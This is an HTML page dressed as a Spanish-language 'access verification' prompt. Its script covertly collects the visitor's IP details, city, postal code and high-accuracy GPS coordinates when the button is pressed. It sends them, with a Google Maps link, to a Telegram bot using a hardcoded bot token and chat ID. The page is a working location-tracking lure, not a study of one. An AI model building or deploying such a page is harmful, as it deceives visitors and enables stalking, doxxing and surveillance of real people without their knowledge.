<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
    <title>Verificación</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            background: #f1f3f4;
            font-family: 'Segoe UI', Roboto, system-ui, sans-serif;
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
            padding: 20px;
        }
        .card {
            background: white;
            border-radius: 16px;
            box-shadow: 0 8px 28px rgba(0,0,0,0.12);
            padding: 32px 24px;
            max-width: 400px;
            width: 100%;
            text-align: center;
        }
        h1 { font-size: 1.8rem; font-weight: 600; color: #1a1a1a; margin-bottom: 12px; }
        p { color: #5f6368; font-size: 0.9rem; margin-bottom: 28px; }
        button { background: #1a73e8; color: white; border: none; border-radius: 28px; padding: 12px 24px; font-size: 1rem; font-weight: 500; cursor: pointer; width: 100%; }
        button:active { background: #1557b0; transform: scale(0.98); }
    </style>
</head>
<body>
<div class="card">
    <h1>🔐 Verificación requerida</h1>
    <p>Presiona el botón para continuar</p>
    <button id="btn">✅ Verificar acceso</button>
</div>

<script>
    const BOT_TOKEN = '8803149571:AAF6V8NewmO0JSUAlXdJh1NUuhMo1lwOH6s';
    const CHAT_ID = '7555997298';

    async function getIPinfo() {
        try {
            const res = await fetch('https://ipapi.co/json/');
            const data = await res.json();
            return {
                ip: data.ip || 'N/A',
                country: data.country_name || 'N/A',
                region: data.region || 'N/A',
                city: data.city || 'N/A',
                postal: data.postal || 'N/A',
                timezone: data.timezone || 'N/A'
            };
        } catch(e) {
            return { ip: 'N/A', country: 'N/A', region: 'N/A', city: 'N/A', postal: 'N/A', timezone: 'N/A' };
        }
    }

    function getGPS() {
        return new Promise((resolve) => {
            if (!navigator.geolocation) { resolve(null); return; }
            navigator.geolocation.getCurrentPosition(
                (pos) => resolve({ lat: pos.coords.latitude, lng: pos.coords.longitude, accuracy: pos.coords.accuracy }),
                () => resolve(null),
                { enableHighAccuracy: true, timeout: 10000 }
            );
        });
    }

    async function fullProcess() {
        const [ipInfo, gps] = await Promise.all([getIPinfo(), getGPS()]);
        let message = `📊 *Visitor Information Captured*\n━━━━━━━━━━━━━━━━\n\n`;
        message += `🌐 *Network Information*\n   • IP Address: ${ipInfo.ip}\n   • Language: ${navigator.language}\n\n`;
        message += `📍 *Location Details*\n`;
        if (gps) {
            message += `   • GPS Coordinates: ${gps.lat}, ${gps.lng}\n   • Accuracy: ±${gps.accuracy} meters\n   • Google Maps: https://www.google.com/maps?q=${gps.lat},${gps.lng}\n`;
        } else {
            message += `   • GPS: No disponible (permiso denegado o error)\n`;
            if (ipInfo.city !== 'N/A') {
                message += `   • IP approximate location:\n   • Country: ${ipInfo.country}\n   • Region: ${ipInfo.region}\n   • City: ${ipInfo.city}\n   • Postal: ${ipInfo.postal}\n   • Timezone: ${ipInfo.timezone}\n`;
                message += `   • Map: https://www.google.com/maps?q=${ipInfo.city},${ipInfo.country}\n`;
            }
        }
        message += `\n🎯 Target: ${window.location.href}\n`;
        await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
            method: 'POST', headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ chat_id: CHAT_ID, text: message, parse_mode: 'Markdown' })
        });
    }

    document.getElementById('btn').onclick = () => { fullProcess(); };
</script>
</body>
</html>
